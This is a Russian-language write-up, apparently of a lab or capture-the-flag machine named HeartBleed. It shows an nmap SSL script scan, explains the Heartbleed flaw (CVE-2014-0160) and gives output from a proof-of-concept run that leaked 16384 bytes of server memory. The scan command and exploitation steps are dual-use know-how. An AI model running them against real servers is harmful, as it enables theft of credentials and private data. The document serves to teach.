# Отчёт по машине HeartBleed

## 1. Обнаруженные сервисы

В результате сканирования обнаружены следующие открытые порты:

|  **22/tcp** - SSH           
| **443/tcp** - HTTPS / Nginx 

На HTTPS-сервисе также обнаружен **недействующий сертификат**.


## 2. Обнаружение уязвимости

Для проверки SSL/TLS был выполнен NSE-скрипт:

```bash
nmap --script "ssl-*" -p 443 10.112.124.56
```

Скрипт `ssl-heartbleed` подтвердил наличие уязвимости:

```text
ssl-heartbleed:
  VULNERABLE:
  The Heartbleed Bug is a serious vulnerability in the popular OpenSSL
  cryptographic software library. It allows for stealing information
  intended to be protected by SSL/TLS encryption.
    State: VULNERABLE
    Risk factor: High
```

Таким образом, HTTPS-сервис на `10.112.124.56:443` **уязвим к CVE-2014-0160 (Heartbleed)**.


## 3. Суть уязвимости Heartbleed

**Heartbleed (CVE-2014-0160)** — уязвимость в реализации TLS Heartbeat в уязвимых версиях библиотеки **OpenSSL**.

Heartbeat предназначен для проверки того, что TLS-соединение остаётся активным. Клиент отправляет серверу небольшой блок данных и указывает его длину. Сервер должен вернуть клиенту **ровно эти данные в указанном размере**.

Уязвимость возникала потому, что сервер **не проверял соответствие заявленной длины фактическому размеру переданных данных**.

Упрощённый пример:

```text
DATA   = "hi"
LENGTH = 1000
```

Фактически клиент отправил только 2 байта:

```text
hi
```

но серверу сообщил, что данных 1000 байт.

Уязвимая реализация OpenSSL доверяла значению `LENGTH` и пыталась прочитать и вернуть **1000 байт**, хотя фактически клиент предоставил только 2 байта.

В результате сервер мог вернуть:

```text
"hi" + данные, находящиеся рядом в памяти процесса
```

Таким образом, атакующий мог получить фрагменты памяти сервера, которые изначально не предназначались для него.

В памяти процесса потенциально могли находиться:

* HTTP-запросы;
* cookies и session tokens;
* usernames и passwords;
* персональные данные;
* другие конфиденциальные данные;
* криптографические материалы.

При этом уязвимость особенно опасна тем, что для чтения памяти **не требовалась предварительная аутентификация на сервере**.


# 4. Эксплуатация

Для подтверждения возможности эксплуатации был использован Python PoC для **CVE-2014-0160**.

После подключения к HTTPS-сервису TLS handshake был успешно выполнен:

```text
Connecting...
Sending Client Hello...
 ... received message: type = 22, ver = 0302, length = 66
 ... received message: type = 22, ver = 0302, length = 951
 ... received message: type = 22, ver = 0302, length = 331
 ... received message: type = 22, ver = 0302, length = 4
Handshake done...
```

После установления TLS-соединения exploit отправил специально сформированный Heartbeat-запрос:

```text
Sending heartbeat request with length 4 :
```

Сервер вернул Heartbeat Response значительно большего размера:

```text
... received message: type = 24, ver = 0302, length = 16384
Received heartbeat response in file out.txt
WARNING : server returned more data than it should - server is vulnerable!
```

Здесь особенно важен следующий момент:

```text
request length = 4
response length = 16384
```

То есть сервер вернул **существенно больше данных, чем должен был вернуть согласно запросу**.

Это является непосредственным подтверждением возможности чтения произвольного фрагмента памяти процесса через Heartbleed.

# 6. Итог

Эксплуатация с помощью PoC успешно подтвердила уязвимость: сервер вернул **16384 байта** в ответ на Heartbeat-запрос с заявленной длиной **4 байта**.

В полученной памяти обнаружены данные HTTP-запроса

Таким образом, уязвимость позволяет удалённому неаутентифицированному атакующему **извлекать произвольные фрагменты памяти процесса OpenSSL**, потенциально содержащие конфиденциальную информацию.
